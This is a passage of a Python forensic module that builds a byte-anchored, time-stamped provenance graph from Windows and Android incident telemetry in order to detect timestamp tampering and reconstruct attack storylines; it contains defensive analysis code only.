"""
SUTRA-Trace - Sector C: Temporal Provenance Knowledge Graph (T-PKG) engine
==========================================================================

Connects the leads of Sector B and raw forensic telemetry into one graph of
byte-anchored, time-stamped edges, checks it for timestamp tampering and
causality breaks, and extracts a short, reproducible attack storyline.

    e_ij(t) = (v_i, v_j, r, t, x_ij, P_sym)

Components (manual section in brackets):

  CSRGraphArena          [2.1] fixed 32-byte edge records (struct "!IIHHQQI") in a
                               preallocated ring; O(1) insert and FIFO eviction;
                               CSR (row-pointer) indexes built on demand.
  ProvenanceLedger       [2.1] the physical anchor of every edge (source file,
                               offset, length, SHA-256) in a parallel 48-byte ring,
                               in RAM or in a fixed-size file on disk.
  BijectiveTimeEncoder   [2.2] Phi(dt) = [cos(w dt + b) || sin(w dt + b) ||
                               ln(1+|dt|)/ln(1+dt_max) || sign(dt)], with decode().
  AntiSupernodeEngine    [2.3] process-epoch splitting of tainted brokers and
                               inverse log-degree attention (gamma = 1.5).
  AntiTimestompEngine    [2.4] five invariants over parsed NTFS $MFT FILE records
                               and $UsnJrnl:$J USN_RECORD_V2 streams, plus
                               parent/child causality repair with an audit ledger.
  PCSTStorylineSolver    [2.5] deterministic prize-collecting Steiner tree in
                               integer (Q16.16) arithmetic; ties broken by the
                               physical byte offset Omega(e).
  TemporalProvenanceGraph  [3] ingestion of Sector A evidence_manifest.json and
                               Sector B triage_manifest.json, telemetry parsers,
                               exports attack_graph.json and incident_storyline.json.

Admissibility rule (Section 63 BSA 2023): no edge enters the graph without a
physical anchor (source_file, byte_offset, length, sha256). Every anchor,
secondary anchors included, is re-hashed from the evidence by default and read
again at export; anchors (and $MFT / $UsnJrnl records) that fall in sectors
Sector A recorded as unreadable are refused or quarantined. Repairs and
quarantines go into a hash-chained audit ledger rooted in Sector A's master case
root, whose head and length are written into both output files.

Revision r2 (after the hostile audit of r1): cross-domain joins only on evidence
(same IP address, record from this device, or a quote from a case document via
--case-bindings); WROTE_FILE time from the kernel ($UsnJrnl FILE_CREATE, then
$FN); causality repair as an interval whose lower bound uses the parent's
connection only to the host the file was downloaded from; invariant grades that
do not mix USN bases or call FAT32 copies / archive extraction timestomps;
integer-only solver costs; bounded memory throughout. The self-test prints
35 manual checks and 16 audit regression checks.

What this module does not do: it does not parse binary EVTX (Sysmon is read
from a JSON-lines export, as in Sector B), it does not run a neural model (edge
anomaly scores come from Sector B, from the heuristics documented in each
parser, or from the caller), and a repaired timestamp is a lower bound ("not
earlier than"), never a claim of the exact true time.

Pure Python standard library; Python 3.10+.
Run `python sector_c_graph.py [workdir]` for the built-in self-test.
Run `python sector_c_graph.py --run --evidence-manifest A.json --triage-manifest B.json
     --evidence-root DIR --out DIR [--case-bindings bindings.json]` to build the graph
     from real Sector A/B outputs. Set SUTRA_AUDIT_KEY to HMAC the audit ledger.
"""

from __future__ import annotations

import array
import bisect
import hashlib
import heapq
import hmac
import importlib.util
import ipaddress
import json
import math
import os
import random
import re
import struct
import sys
import time
import datetime
from collections import Counter, OrderedDict, defaultdict
from typing import Any, Callable, Dict, Iterable, Iterator, List, Optional, Sequence, Set, Tuple


# --------------------------------------------------------------------------- #
# Sibling sectors (loaded by path from this folder, never from sys.path)      #
# --------------------------------------------------------------------------- #

def _load_sibling(module_name: str, filename: str):
    """Import prototype/<filename> from this folder, not an older copy elsewhere on sys.path."""
    here = os.path.dirname(os.path.abspath(__file__))
    path = os.path.join(here, filename)
    mod = sys.modules.get(module_name)
    if mod is not None and os.path.abspath(getattr(mod, "__file__", "")) == path:
        return mod
    if not os.path.isfile(path):
        return None
    try:
        name = module_name if mod is None else "_sutra_" + module_name
        spec = importlib.util.spec_from_file_location(name, path)
        mod = importlib.util.module_from_spec(spec)
        sys.modules[name] = mod
        spec.loader.exec_module(mod)  # type: ignore[union-attr]
        return mod
    except Exception:  # pragma: no cover - sibling broken or absent
        return None


_sector_a = _load_sibling("sector_a_vault", "sector_a_vault.py")
_sector_b = _load_sibling("sector_b_triage", "sector_b_triage.py")

GRAPH_VERSION = "SUTRA-GRAPH-2026.3-SUPREME"
GRAPH_REVISION = "r2"
ATTACK_GRAPH_FILENAME = "attack_graph.json"
STORYLINE_FILENAME = "incident_storyline.json"
SECTOR_A_MANIFEST = getattr(_sector_a, "MANIFEST_FILENAME", "evidence_manifest.json")
SECTOR_B_MANIFEST = getattr(_sector_b, "MANIFEST_FILENAME", "triage_manifest.json")


# --------------------------------------------------------------------------- #
# Relations, flags, entity kinds                                              #
# --------------------------------------------------------------------------- #

REL_SPAWNED = 1
REL_CONNECTED_TO = 2
REL_WROTE_FILE = 3
REL_UPI_TRANSFER = 4
REL_OVERLAY_HIJACK = 5
REL_IMPERSONATED_CALL = 6
REL_INJECTED_INTO = 7
REL_EPOCH_TRANSITION = 8
REL_CROSS_RAIL_BRIDGE = 9
REL_CASH_HANDOVER = 10
REL_INSTALLED = 11
REL_REMOTE_SESSION = 12
REL_EXECUTED = 13
REL_OWNS = 14
REL_LOGGED_IN_AS = 15
REL_EMBEDS_PAYLOAD = 16
REL_VIRTUAL_CAMERA = 17
REL_PEER_ENDPOINT = 18
REL_FLAGGED_AS = 19
REL_READ_FILE = 20
REL_LOADED_MODULE = 21
REL_RESOLVES_TO = 22
REL_OBSERVED_ON = 23

RELATION_NAMES = {
    REL_SPAWNED: "SPAWNED", REL_CONNECTED_TO: "CONNECTED_TO", REL_WROTE_FILE: "WROTE_FILE",
    REL_UPI_TRANSFER: "UPI_TRANSFER", REL_OVERLAY_HIJACK: "OVERLAY_HIJACK",
    REL_IMPERSONATED_CALL: "IMPERSONATED_CALL", REL_INJECTED_INTO: "INJECTED_INTO",
    REL_EPOCH_TRANSITION: "EPOCH_TRANSITION", REL_CROSS_RAIL_BRIDGE: "CROSS_RAIL_BRIDGE",
    REL_CASH_HANDOVER: "CASH_HANDOVER", REL_INSTALLED: "INSTALLED", REL_REMOTE_SESSION: "REMOTE_SESSION",
    REL_EXECUTED: "EXECUTED", REL_OWNS: "OWNS", REL_LOGGED_IN_AS: "LOGGED_IN_AS",
    REL_EMBEDS_PAYLOAD: "EMBEDS_PAYLOAD", REL_VIRTUAL_CAMERA: "VIRTUAL_CAMERA_SOURCE",
    REL_PEER_ENDPOINT: "PEER_ENDPOINT", REL_FLAGGED_AS: "FLAGGED_AS", REL_READ_FILE: "READ_FILE",
    REL_LOADED_MODULE: "LOADED_MODULE", REL_RESOLVES_TO: "RESOLVES_TO", REL_OBSERVED_ON: "OBSERVED_ON",
}
RELATION_BY_NAME = {v: k for k, v in RELATION_NAMES.items()}

# Relations that bind an identity to an account, device or session. They connect the
# storyline but are reported as attribution links, not as numbered attack steps.
BINDING_RELATIONS = frozenset({REL_OWNS, REL_LOGGED_IN_AS, REL_EXECUTED, REL_EPOCH_TRANSITION, REL_RESOLVES_TO,
                               REL_OBSERVED_ON})

# Edges whose source is a process and whose timestamp is an action of that process
# (Invariant 5 checks these against the process creation time).
PROCESS_ACTION_RELATIONS = frozenset({REL_SPAWNED, REL_CONNECTED_TO, REL_WROTE_FILE, REL_INJECTED_INTO,
                                      REL_READ_FILE})

# Code injection (Sysmon 8) and loading an unsigned / user-writable module (Sysmon 7): the relations
# that taint a broker. Injection that happened before capture, or by a route no sensor logged, cannot
# be seen here; see AntiSupernodeEngine for how such brokers are kept from muting their own children.
TAINT_RELATIONS = frozenset({REL_INJECTED_INTO, REL_LOADED_MODULE})

STAGES = {
    1: "Initial Infiltration & Deepfake Contact",
    2: "Sideloaded Execution & Persistence",
    3: "Credential Theft / Screen Overlay Hijack",
    4: "Financial Exfiltration & Multi-Tier Smurfing",
}
RELATION_STAGE = {
    REL_IMPERSONATED_CALL: 1, REL_REMOTE_SESSION: 1, REL_VIRTUAL_CAMERA: 1, REL_PEER_ENDPOINT: 1,
    REL_SPAWNED: 2, REL_WROTE_FILE: 2, REL_CONNECTED_TO: 2, REL_INSTALLED: 2, REL_EMBEDS_PAYLOAD: 2,
    REL_READ_FILE: 2, REL_FLAGGED_AS: 2,
    REL_INJECTED_INTO: 3, REL_OVERLAY_HIJACK: 3, REL_LOADED_MODULE: 3,
    REL_UPI_TRANSFER: 4, REL_CROSS_RAIL_BRIDGE: 4, REL_CASH_HANDOVER: 4,
}
RELATION_VERB = {
    REL_SPAWNED: "spawned", REL_CONNECTED_TO: "connected to", REL_WROTE_FILE: "wrote file",
    REL_UPI_TRANSFER: "transferred funds to", REL_OVERLAY_HIJACK: "drew an overlay over",
    REL_IMPERSONATED_CALL: "placed an impersonation call to", REL_INJECTED_INTO: "injected code into",
    REL_EPOCH_TRANSITION: "was tainted, becoming", REL_CROSS_RAIL_BRIDGE: "bridged funds off-rail to",
    REL_CASH_HANDOVER: "arranged a cash hand-over with", REL_INSTALLED: "installed",
    REL_REMOTE_SESSION: "opened a remote session on", REL_EXECUTED: "launched",
    REL_OWNS: "is the registered holder of", REL_LOGGED_IN_AS: "was signed in as",
    REL_EMBEDS_PAYLOAD: "carries hidden payload", REL_VIRTUAL_CAMERA: "fed a virtual camera into",
    REL_PEER_ENDPOINT: "was the media peer of", REL_FLAGGED_AS: "was flagged as", REL_READ_FILE: "read file",
    REL_LOADED_MODULE: "loaded module", REL_RESOLVES_TO: "is the network endpoint",
    REL_OBSERVED_ON: "was recorded on",
}

FLAG_SUSPICIOUS = 0x0001
FLAG_TIMESTOMP_INVERTED = 0x0002
FLAG_CROSS_RAIL = 0x0004
FLAG_EXCULPATORY = 0x0008
FLAG_TAINTED_EPOCH = 0x0010
FLAG_TIME_REPAIRED = 0x0020
FLAG_TIME_UNKNOWN = 0x0040
FLAG_MULTI_ANCHOR = 0x0080
FLAG_NAMES = {FLAG_SUSPICIOUS: "IS_SUSPICIOUS", FLAG_TIMESTOMP_INVERTED: "TIMESTOMP_INVERTED",
              FLAG_CROSS_RAIL: "CROSS_RAIL", FLAG_EXCULPATORY: "EXCULPATORY",
              FLAG_TAINTED_EPOCH: "TAINTED_EPOCH", FLAG_TIME_REPAIRED: "TIME_REPAIRED",
              FLAG_TIME_UNKNOWN: "TIME_UNKNOWN", FLAG_MULTI_ANCHOR: "MULTI_ANCHOR"}

ENTITY_KINDS = ("PROCESS", "FILE", "SOCKET", "UPI_ACCOUNT", "IDENTITY", "DEVICE", "APP_PACKAGE",
                "CRYPTO_WALLET", "CALL_SESSION", "REGISTRY_KEY", "CASH_TOKEN", "INDICATOR", "HOST")

# High-degree system brokers whose node is split into epochs when an untrusted subject taints them.
BROKER_PROCESSES = frozenset({"svchost.exe", "explorer.exe", "services.exe", "lsass.exe", "wmiprvse.exe",
                              "dllhost.exe", "rundll32.exe", "runtimebroker.exe", "taskhostw.exe",
                              "system_server", "zygote", "zygote64", "com.android.systemui"})
USER_SHELLS = frozenset({"explorer.exe", "userinit.exe"})

Q16 = 1 << 16
LOSS_MAX_Q16 = Q16              # anomaly score 1.0
NS = 1_000_000_000
FILETIME_EPOCH_DIFF = 116444736000000000   # 100-ns ticks between 1601-01-01 and 1970-01-01
IST = datetime.timezone(datetime.timedelta(minutes=330))


class ProvenanceError(ValueError):
    """An edge was offered without a complete physical anchor (Section 63 BSA rule)."""


# --------------------------------------------------------------------------- #
# Small helpers                                                               #
# --------------------------------------------------------------------------- #

def _sha256_hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def canonical_json(obj: Any) -> bytes:
    """Sorted keys, compact separators, NaN/Inf rejected: the byte form that is hashed."""
    return json.dumps(obj, sort_keys=True, separators=(",", ":"), ensure_ascii=False, allow_nan=False).encode()


def score_to_q16(score: Optional[float]) -> int:
    if score is None or not isinstance(score, (int, float)) or score != score or score in (math.inf, -math.inf):
        return 0
    return max(0, min(0xFFFFFFFF, int(round(float(score) * Q16))))


def q16_to_score(q: int) -> float:
    return round(q / Q16, 6)


def ns_to_iso(ns: int) -> Optional[str]:
    if not ns:
        return None
    sec, rem = divmod(int(ns), NS)
    dt = datetime.datetime.fromtimestamp(sec, tz=datetime.timezone.utc)
    return dt.strftime("%Y-%m-%dT%H:%M:%S.") + f"{rem:09d}Z"


def iso_to_ns(value: Any, default_tz: datetime.tzinfo = datetime.timezone.utc) -> int:
    """Parse ISO-8601 / 'YYYY-MM-DD HH:MM:SS[.fff]' (naive values use default_tz) to Unix ns. 0 if absent."""
    if value is None or value == "":
        return 0
    if isinstance(value, (int, float)):
        return int(value)
    s = str(value).strip().replace("Z", "+00:00")
    m = re.fullmatch(r"(\d{4}-\d{2}-\d{2})[T ](\d{2}:\d{2}:\d{2})(?:\.(\d{1,9}))?([+-]\d{2}:\d{2})?", s)
    if not m:
        raise ValueError(f"unparseable timestamp {value!r}")
    base = datetime.datetime.fromisoformat(f"{m.group(1)}T{m.group(2)}")
    tz = datetime.timezone.utc if m.group(4) is None else datetime.datetime.strptime(
        m.group(4).replace(":", ""), "%z").tzinfo
    base = base.replace(tzinfo=default_tz if m.group(4) is None else tz)
    frac = int((m.group(3) or "0").ljust(9, "0"))
    return (int(base.timestamp()) * NS) + frac


def filetime_to_ns(ft: int) -> int:
    return (ft - FILETIME_EPOCH_DIFF) * 100 if ft else 0


def ns_to_filetime(ns: int) -> int:
    return ns // 100 + FILETIME_EPOCH_DIFF


def _basename(path: Optional[str]) -> str:
    if not path:
        return ""
    return re.split(r"[\\/]", str(path).strip().strip('"'))[-1].lower()


def flag_names(flags: int) -> List[str]:
    return [n for b, n in sorted(FLAG_NAMES.items()) if flags & b]


# --------------------------------------------------------------------------- #
# 2.1  32-byte CSR ring arena                                                 #
# --------------------------------------------------------------------------- #

class CSRGraphArena:
    """
    Contiguous ring of fixed 32-byte edge records:

        src_id u32 | dst_id u32 | rel_id u16 | flags u16 | timestamp_ns u64 | byte_offset u64 | loss_q16 u32

    Edge number `seq` (monotonic, never reused) lives in slot seq % capacity, so the
    ring needs no per-edge index. Inserting into a full ring overwrites (evicts) the
    oldest edge; evict_oldest / evict_before slide the window explicitly. All
    operations are O(1) per edge. build_csr() returns forward or reverse CSR indexes
    (row pointers + slot lists) over the live edges; they are rebuilt after any change.
    """

    RECORD = struct.Struct("!IIHHQQI")
    RECORD_SIZE = RECORD.size  # 32
    MAX_TS = (1 << 64) - 1

    def __init__(self, capacity: int = 1_000_000):
        if capacity <= 0:
            raise ValueError("capacity must be positive")
        self.capacity = int(capacity)
        self.buf = bytearray(self.capacity * self.RECORD_SIZE)
        self.next_seq = 0       # seq of the next edge to be written
        self.count = 0          # live edges
        self.evicted = 0
        self._csr: Dict[str, Any] = {}
        self.on_evict: Optional[Callable[[int, Tuple[int, ...]], None]] = None

    @property
    def nbytes(self) -> int:
        return len(self.buf)

    @property
    def oldest_seq(self) -> int:
        return self.next_seq - self.count

    def append(self, src: int, dst: int, rel: int, flags: int, ts_ns: int, byte_offset: int, loss_q16: int) -> int:
        if self.count == self.capacity:
            self._evict_one()
        seq = self.next_seq
        self.RECORD.pack_into(self.buf, (seq % self.capacity) * self.RECORD_SIZE,
                              src, dst, rel, flags & 0xFFFF, ts_ns, byte_offset, loss_q16)
        self.next_seq += 1
        self.count += 1
        self._csr = {}
        return seq

    def is_live(self, seq: int) -> bool:
        return self.oldest_seq <= seq < self.next_seq

    def get(self, seq: int) -> Tuple[int, int, int, int, int, int, int]:
        if not self.is_live(seq):
            raise KeyError(f"edge {seq} is not in the live window")
        return self.RECORD.unpack_from(self.buf, (seq % self.capacity) * self.RECORD_SIZE)

    def update(self, seq: int, **fields: int) -> None:
        names = ("src", "dst", "rel", "flags", "ts", "offset", "loss")
        rec = dict(zip(names, self.get(seq)))
        for k, v in fields.items():
            if k not in rec:
                raise KeyError(k)
            rec[k] = v
        self.RECORD.pack_into(self.buf, (seq % self.capacity) * self.RECORD_SIZE, *(rec[n] for n in names))
        self._csr = {}

    def _evict_one(self) -> None:
        seq = self.oldest_seq
        rec = self.get(seq)
        self.count -= 1
        self.evicted += 1
        self._csr = {}
        if self.on_evict:
            self.on_evict(seq, rec)

    def evict_oldest(self, n: int) -> int:
        n = min(n, self.count)
        for _ in range(n):
            self._evict_one()
        return n

    def evict_before(self, ts_ns: int) -> int:
        """Slide the window: evict from the oldest end while edges are older than ts_ns (FIFO order)."""
        n = 0
        while self.count:
            ts = self.RECORD.unpack_from(self.buf, (self.oldest_seq % self.capacity) * self.RECORD_SIZE)[4]
            if ts >= ts_ns or ts == 0:
                break
            self._evict_one()
            n += 1
        return n

    def live_seqs(self) -> range:
        return range(self.oldest_seq, self.next_seq)

    def iter_edges(self) -> Iterator[Tuple[int, Tuple[int, ...]]]:
        unpack, size, cap, buf = self.RECORD.unpack_from, self.RECORD_SIZE, self.capacity, self.buf
        for seq in range(self.oldest_seq, self.next_seq):
            yield seq, unpack(buf, (seq % cap) * size)

    def record(self, seq: int) -> Tuple[int, int, int, int, int, int, int]:
        """Unchecked read of a live slot (callers iterate live_seqs())."""
        return self.RECORD.unpack_from(self.buf, (seq % self.capacity) * self.RECORD_SIZE)

    def build_csr(self, n_nodes: int, reverse: bool = False) -> Tuple["array.array", "array.array"]:
        """
        CSR over live edges as flat arrays (8 bytes per edge, no per-edge Python objects):
        row_ptr[v]..row_ptr[v+1] index into `seqs`, the edge numbers whose source (or destination,
        if reverse) is v, in insertion order. Built by counting sort in two passes over the ring.
        """
        key = "rev" if reverse else "fwd"
        cached = self._csr.get(key)
        if cached and cached[0] == n_nodes:
            return cached[1], cached[2]
        col = 1 if reverse else 0
        unpack, size, cap, buf = self.RECORD.unpack_from, self.RECORD_SIZE, self.capacity, self.buf
        row_ptr = array.array("Q", bytes(8 * (n_nodes + 1)))
        for seq in range(self.oldest_seq, self.next_seq):
            row_ptr[unpack(buf, (seq % cap) * size)[col] + 1] += 1
        for i in range(1, n_nodes + 1):
            row_ptr[i] += row_ptr[i - 1]
        fill = array.array("Q", row_ptr)
        seqs = array.array("Q", bytes(8 * self.count))
        for seq in range(self.oldest_seq, self.next_seq):
            v = unpack(buf, (seq % cap) * size)[col]
            seqs[fill[v]] = seq
            fill[v] += 1
        self._csr[key] = (n_nodes, row_ptr, seqs)
        return row_ptr, seqs


class ProvenanceLedger:
    """
    Physical anchor of every edge, kept in step with the arena: record `seq` sits in slot
    seq % capacity, 48 bytes "!IQI32s" = source index, byte offset, length, raw SHA-256.
    With `path`, the ring is a fixed-size file on disk (zero RAM per edge); otherwise a
    bytearray. Source files are interned once.
    """

    RECORD = struct.Struct("!IQI32s")
    RECORD_SIZE = RECORD.size  # 48

    def __init__(self, capacity: int, path: Optional[str] = None):
        self.capacity = capacity
        self.path = path
        self.sources: List[Dict[str, Any]] = []
        self._source_ix: Dict[Tuple[str, str, str], int] = {}
        if path:
            self._fh = open(path, "w+b")
            self._fh.truncate(capacity * self.RECORD_SIZE)
            self.buf = None
        else:
            self._fh = None
            self.buf = bytearray(capacity * self.RECORD_SIZE)

    @property
    def nbytes_in_ram(self) -> int:
        return len(self.buf) if self.buf is not None else 0

    def intern_source(self, source_file: str, source_type: str = "", offset_basis: str = "FILE") -> int:
        key = (source_file, source_type, offset_basis)
        ix = self._source_ix.get(key)
        if ix is None:
            ix = len(self.sources)
            self.sources.append({"source_file": source_file, "source_type": source_type,
                                 "offset_basis": offset_basis})
            self._source_ix[key] = ix
        return ix

    def put(self, seq: int, source_ix: int, offset: int, length: int, sha256_hex: str) -> None:
        rec = self.RECORD.pack(source_ix, offset, length, bytes.fromhex(sha256_hex))
        pos = (seq % self.capacity) * self.RECORD_SIZE
        if self.buf is not None:
            self.buf[pos:pos + self.RECORD_SIZE] = rec
        else:
            self._fh.seek(pos)
            self._fh.write(rec)

    def get(self, seq: int) -> Dict[str, Any]:
        pos = (seq % self.capacity) * self.RECORD_SIZE
        if self.buf is not None:
            raw = bytes(self.buf[pos:pos + self.RECORD_SIZE])
        else:
            self._fh.seek(pos)
            raw = self._fh.read(self.RECORD_SIZE)
        six, off, length, digest = self.RECORD.unpack(raw)
        src = self.sources[six]
        return {"source_file": src["source_file"], "source_type": src["source_type"],
                "offset_basis": src["offset_basis"], "byte_offset": off, "length": length,
                "sha256": digest.hex()}

    def close(self) -> None:
        if self._fh:
            self._fh.close()
            self._fh = None


class GraphEntityTable:
    """
    Interns (kind, name, epoch) to dense u32 ids, with a live-edge reference count per id. When the
    ring evicts the last edge of an entity that carries no prize and is not pinned, its slot is
    tombstoned and its id reused, so a flood of one-off names (random process names, ephemeral
    ports, GUIDs) cannot grow the table without bound: live entities <= 2 x arena capacity + pinned.
    """

    def __init__(self):
        self.kinds: List[Optional[str]] = []
        self.names: List[Optional[str]] = []
        self.epochs: List[int] = []
        self.refs = array.array("I")
        self.pinned: Set[int] = set()
        self._ix: Dict[Tuple[str, str, int], int] = {}
        self._free: List[int] = []
        self.on_release: Optional[Callable[[int], None]] = None

    def __len__(self) -> int:
        return len(self.names)

    @property
    def live(self) -> int:
        return len(self._ix)

    def intern(self, kind: str, name: str, epoch: int = 0) -> int:
        if kind not in ENTITY_KINDS:
            raise ValueError(f"unknown entity kind {kind!r}")
        if not name:
            raise ValueError("entity name must be non-empty")
        key = (kind, name, epoch)
        ix = self._ix.get(key)
        if ix is None:
            if self._free:
                ix = self._free.pop()
                self.kinds[ix], self.names[ix], self.epochs[ix], self.refs[ix] = kind, name, epoch, 0
            else:
                ix = len(self.names)
                self.kinds.append(kind)
                self.names.append(name)
                self.epochs.append(epoch)
                self.refs.append(0)
            self._ix[key] = ix
        return ix

    def lookup(self, kind: str, name: str, epoch: int = 0) -> Optional[int]:
        return self._ix.get((kind, name, epoch))

    def incref(self, ix: int) -> None:
        self.refs[ix] += 1

    def decref(self, ix: int) -> None:
        self.refs[ix] -= 1
        if self.refs[ix] == 0 and ix not in self.pinned:
            self.release(ix)

    def release(self, ix: int) -> None:
        if self.names[ix] is None:
            return
        del self._ix[(self.kinds[ix], self.names[ix], self.epochs[ix])]
        self.kinds[ix] = self.names[ix] = None
        self._free.append(ix)
        if self.on_release:
            self.on_release(ix)

    def label(self, ix: int) -> str:
        e = self.epochs[ix]
        return f"{self.names[ix]}[epoch_{e}]" if e else str(self.names[ix])

    def key(self, ix: int) -> Tuple[str, str, int]:
        """Insertion-order-free identity of a node, used for deterministic ordering."""
        return (self.kinds[ix] or "", self.names[ix] or "", self.epochs[ix])


# --------------------------------------------------------------------------- #
# 2.2  Bijective harmonic-logarithmic time encoding                           #
# --------------------------------------------------------------------------- #

class BijectiveTimeEncoder:
    """
    Phi(dt) = [cos(w_k dt + b_k)]_k || [sin(w_k dt + b_k)]_k || ln(1+|dt|)/ln(1+dt_max) || sign(dt)

    w_k = omega_0 * 10^(-9k/d), k = 0..d-1 (geometric frequencies), b_k = pi*k/(2d), dt in seconds.
    The harmonic block alone is periodic (dt and dt + 2*pi/w alias for one frequency); the
    logarithmic envelope is strictly increasing in |dt| and the sign term carries direction,
    so Phi is injective on [-dt_max, dt_max] and decode() recovers dt from those two terms.
    Values outside the domain raise ValueError rather than saturate (saturation would alias).
    """

    def __init__(self, d: int = 8, dt_max_s: float = 90 * 86400.0, omega_0: float = 1.0):
        if d < 1 or dt_max_s <= 0:
            raise ValueError("d >= 1 and dt_max_s > 0 required")
        self.d = d
        self.dt_max = float(dt_max_s)
        self.omegas = [omega_0 * 10.0 ** (-9.0 * k / d) for k in range(d)]
        self.phases = [math.pi * k / (2.0 * d) for k in range(d)]
        self._log_den = math.log1p(self.dt_max)

    @property
    def dim(self) -> int:
        return 2 * self.d + 2

    def encode(self, dt_s: float) -> Tuple[float, ...]:
        dt = float(dt_s)
        if not math.isfinite(dt) or abs(dt) > self.dt_max:
            raise ValueError(f"|dt| = {abs(dt)} s outside the encoder domain (dt_max = {self.dt_max} s)")
        ang = [w * dt + b for w, b in zip(self.omegas, self.phases)]
        sign = 0.0 if dt == 0 else math.copysign(1.0, dt)
        return tuple([math.cos(a) for a in ang] + [math.sin(a) for a in ang]
                     + [math.log1p(abs(dt)) / self._log_den, sign])

    def decode(self, phi: Sequence[float]) -> float:
        if len(phi) != self.dim:
            raise ValueError("wrong embedding length")
        return phi[-1] * math.expm1(phi[-2] * self._log_den)

    def harmonic_part(self, dt_s: float) -> Tuple[float, ...]:
        return self.encode(dt_s)[:2 * self.d]

    # Exact path for integer nanoseconds. In binary64, ln(1+|dt|) at 30-90 days cannot separate
    # timestamps a few ns apart, so encode() is injective only to about 10 ns there. encode_ns()
    # splits dt into whole seconds (log envelope, adjacent seconds differ by ~1e-7, far above one
    # ulp) and the sub-second remainder in ns / 1e9 (exactly recoverable), so every pair of distinct
    # integer-ns values in the domain maps to distinct vectors and decode_ns() returns dt exactly.

    @property
    def dim_ns(self) -> int:
        return 2 * self.d + 3

    def encode_ns(self, dt_ns: int) -> Tuple[float, ...]:
        dt_ns = int(dt_ns)
        mag = abs(dt_ns)
        if mag > int(self.dt_max * NS):
            raise ValueError(f"|dt| = {mag} ns outside the encoder domain")
        sec, frac = divmod(mag, NS)
        sign = 0.0 if dt_ns == 0 else (1.0 if dt_ns > 0 else -1.0)
        harm = self.encode(dt_ns / NS)[:2 * self.d]
        return harm + (math.log1p(sec) / self._log_den, frac / NS, sign)

    def decode_ns(self, phi: Sequence[float]) -> int:
        if len(phi) != self.dim_ns:
            raise ValueError("wrong embedding length")
        sec = int(round(math.expm1(phi[-3] * self._log_den)))
        frac = int(round(phi[-2] * NS))
        return int(phi[-1]) * (sec * NS + frac)


# --------------------------------------------------------------------------- #
# 2.3  Anti-supernode gating and process-epoch splitting                      #
# --------------------------------------------------------------------------- #

# Log-prior L_prior(r) per relation for the attention numerator. These are fixed, documented
# priors (how much a relation matters to an investigator), not learned weights.
REL_LOG_PRIOR = {
    REL_INJECTED_INTO: 2.0, REL_IMPERSONATED_CALL: 2.0, REL_OVERLAY_HIJACK: 2.0, REL_CROSS_RAIL_BRIDGE: 1.5,
    REL_UPI_TRANSFER: 1.0, REL_REMOTE_SESSION: 1.5, REL_EPOCH_TRANSITION: 1.0, REL_CASH_HANDOVER: 1.0,
    REL_SPAWNED: 0.5, REL_CONNECTED_TO: 0.5, REL_WROTE_FILE: 0.5, REL_INSTALLED: 0.5, REL_LOADED_MODULE: 1.5,
}
# exp(L_prior) in Q16.16, written out as integers so no transcendental function runs at analysis time.
_EXP_PRIOR_Q16 = {2.0: 484249, 1.5: 293712, 1.0: 178145, 0.5: 108051, 0.0: 65536}
# GATE_Q16[k] = ((1 + ln 2) / (1 + ln(1 + 2^k)))^1.5 in Q16.16 for out-degree bucket 2^k <= deg < 2^(k+1).
GATE_Q16 = (65536, 47492, 34253, 25256, 19239, 15143, 12267, 10179, 8615, 7411, 6463, 5700, 5076, 4558, 4123,
            3753, 3434, 3159, 2918, 2707, 2520, 2353, 2204, 2070, 1950, 1840, 1740, 1649, 1566, 1490, 1419,
            1354, 1294, 1238, 1186, 1137, 1092, 1050, 1010, 973, 938)
# INV_DEG_Q16[0] = 1 (degree 0); INV_DEG_Q16[k+1] = (1 + ln(1 + 2^k))^-1.5 in Q16.16.
INV_DEG_Q16 = (65536, 65536, 29747, 21557, 15547, 11464, 8732, 6873, 5568, 4620, 3910, 3364, 2933, 2587, 2304,
               2069, 1871, 1703, 1559, 1434, 1325, 1229, 1144, 1068, 1001, 940, 885, 835, 790, 749, 711, 676,
               644, 615, 587, 562, 538, 516, 496, 476, 458, 442, 426)
GATE_EXEMPT_LOSS_Q16 = int(0.85 * Q16)


class AntiSupernodeEngine:
    """
    Process-epoch splitting: a broker (svchost.exe, system_server, ...) is one node per epoch.
    When an untrusted subject taints it (code injection), a new epoch v^(k+1) starts at the
    taint time; edges of the broker are bound to the epoch active at their own timestamp, so
    children spawned after the taint attach only to the tainted epoch.

    Splitting is triggered when the injecting subject is not a broker, is itself a tainted
    broker epoch, or the taint edge is scored >= 0.8 (so rundll32 -> lsass injection splits too).

    Inverse log-degree gating over the live window (the arena contents):
        alpha_ij = exp(L_prior(r_ij)) / (1 + ln(1 + deg(v_i, r_ij)))^gamma
    gate_q16() is the same denominator normalised to 1 at degree 1. It is applied only to edges
    out of an *untainted broker epoch* and never to an edge scored >= 0.85, so a hub's background
    noise is attenuated while ransomware writing 10,000 files, a smurfing hub, or a
    high-scoring child of a broker compromised before capture keep their full weight.
    Both are integer table look-ups over power-of-two degree buckets (gamma fixed at 1.5), so
    solver costs do not depend on the platform's libm.
    """

    def __init__(self, entities: GraphEntityTable, gamma: float = 1.5,
                 brokers: Iterable[str] = BROKER_PROCESSES):
        self.entities = entities
        self.gamma = gamma
        self.brokers = frozenset(b.lower() for b in brokers)
        self.splits: Dict[str, List[Tuple[int, int]]] = {}   # broker name -> [(t_start_ns, entity id)], sorted
        self.degree: Counter = Counter()                      # (src id, rel) -> live out-degree

    @staticmethod
    def image_of(name: str) -> str:
        return re.split(r"[#:]", _basename(name), maxsplit=1)[0]

    def is_broker(self, kind: str, name: str) -> bool:
        return kind == "PROCESS" and self.image_of(name) in self.brokers

    def pinned_ids(self) -> Set[int]:
        return {i for tl in self.splits.values() for _, i in tl}

    def _timeline(self, name: str) -> List[Tuple[int, int]]:
        tl = self.splits.get(name)
        if tl is None:
            tl = [(0, self.entities.intern("PROCESS", name, 1))]
            self.entities.pinned.add(tl[0][1])
            self.splits[name] = tl
        return tl

    def resolve(self, kind: str, name: str, ts_ns: int) -> int:
        if not self.is_broker(kind, name):
            return self.entities.intern(kind, name, 0)
        tl = self._timeline(name)
        if ts_ns <= 0:
            return tl[0][1]
        i = bisect.bisect_right([t for t, _ in tl], ts_ns) - 1
        return tl[max(i, 0)][1]

    def split(self, name: str, ts_ns: int) -> Tuple[int, int, bool]:
        """Start a new epoch of broker `name` at ts_ns. Returns (previous epoch id, new epoch id, created)."""
        tl = self._timeline(name)
        starts = [t for t, _ in tl]
        if ts_ns in starts:
            i = starts.index(ts_ns)
